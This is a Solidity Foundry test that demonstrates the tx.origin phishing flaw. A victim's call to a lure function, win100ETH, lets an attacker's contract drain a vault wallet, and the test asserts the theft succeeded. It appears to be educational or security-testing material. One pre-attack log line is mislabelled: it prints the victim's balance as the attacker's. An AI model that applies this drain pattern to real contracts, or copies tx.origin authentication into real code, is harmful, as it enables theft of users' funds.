// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Wallet, Phishing } from "../src/TxOrigin.sol";
import { Test, console } from "forge-std/Test.sol";

contract TxOriginTest is Test {
    Wallet public wallet;
    Phishing public phishing;
    address public attacker;
    address public victim;

    function setUp() public {
        attacker = vm.addr(1);
        victim = vm.addr(2);

        vm.prank(victim, victim);
        wallet = new Wallet();
        vm.prank(attacker);
        phishing = new Phishing(wallet);

        // victim deposits ether into a vault wallet
        vm.deal(victim, 10 ether);
        vm.prank(victim, victim);
        wallet.deposit{ value: 10 ether }();
    }

    function testTxOriginCanBeUsedForPhishing() public {
        console.log("[PRE-ATTACK]:  Vault balance: ", wallet.getBalance());
        console.log("[PRE-ATTACK]:  Attacker balance: ", victim.balance);

        // victim falls into phishing scam
        vm.prank(victim, victim);
        phishing.win100ETH(); // this will call the `drain()` function

        console.log("[POST-ATTACK]: Vault balance: ", wallet.getBalance());
        console.log("[POST-ATTACK]: Attacker balance: ", attacker.balance);

        assertEq(wallet.getBalance(), 0);
        assertEq(attacker.balance, 10 ether);
    }
}
